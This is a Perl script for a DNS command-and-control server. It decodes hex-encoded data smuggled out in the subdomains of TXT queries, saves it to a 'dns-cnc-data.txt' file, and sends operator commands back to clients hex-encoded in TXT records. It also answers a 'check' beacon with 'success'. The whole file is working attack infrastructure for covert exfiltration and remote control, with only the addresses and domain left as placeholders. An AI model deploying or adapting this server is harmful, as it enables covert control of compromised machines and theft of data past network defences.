#!/usr/bin/perl
 
use strict; use warnings; use Net::DNS::Nameserver; use String::HexConvert ':all'; 
my $laddr = "xxx";
my $laddr_int = "xxx"; 
my $lport = "53"; 
my $domain = "xxx"; 
my $cmdfile = "dns-cnc-commands.txt"; 
my $outfile = "dns-cnc-data.txt";
 
sub reply_handler {
    my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
    my ($rcode, @ans, @auth, @add);
 
    print "Received query from $peerhost to ". $conn->{sockhost}. "\n";
    $query->print;
 
   
      if ($qtype eq "A" && $qname eq $domain) {
            #respond
            my $ip = $laddr;
            my ($ttl, $rdata) = (3600, $ip);
            my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
            push @ans, $rr;
            $rcode = "NOERROR";
    }elsif ($qtype eq "A") {
            #respond
            my $ip = (int(rand(254)) + 1) . '.' .(int(rand(254)) + 1) . '.' . (int(rand(254)) + 1) . '.' . (int(rand(254)) + 1);
            my ($ttl, $rdata) = (3600, $ip);
            my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
            push @ans, $rr;
            $rcode = "NOERROR";
    }  elsif($qtype eq "TXT" && (index($qname, "check") != -1) ) {
	        
            print "testing request\n";
            #send data
               my $cmd = 'success';
                my $rr = new Net::DNS::RR( name => $qname,
                        type => 'TXT',
                        txtdata => ascii_to_hex($cmd)
                        );
                push @ans, $rr;
         
            $rcode = "NOERROR";
    }elsif($qtype eq "TXT") {
	        
			#save data
            my @tokens = split(/\./, $qname);
            my $hexdata = $tokens[0];
            my $decodedata = hex_to_ascii($hexdata);
            print $decodedata . "\n";
            open(my $OUTPUT, '>>' ,$outfile) or die "Could not open output file $!\n";
            print $OUTPUT $decodedata . "\n";
            close $OUTPUT;
			
            print "txt request\n";
            #send data
			open(my $cmds, '<' ,$cmdfile) or die "Could not open commands file $!\n";
        
            while (my $row = <$cmds>) {
               chomp $row;
               my $cmd = $row;
                my $rr = new Net::DNS::RR( name => $qname,
                        type => 'TXT',
                        txtdata => ascii_to_hex($cmd)
                        );
                push @ans, $rr;
            }
            close $cmds;
            $rcode = "NOERROR";
    }
    # mark the answer as authoritive (by setting the 'aa' flag
    return ($rcode, \@ans, \@auth, \@add, { aa => 1 });
}
 
my $ns = new Net::DNS::Nameserver(
    LocalAddr => $laddr_int,
    LocalPort => $lport,
    ReplyHandler => \&reply_handler,
    Verbose => 0
    ) || die "couldn't create nameserver object\n";
 
$ns->main_loop;
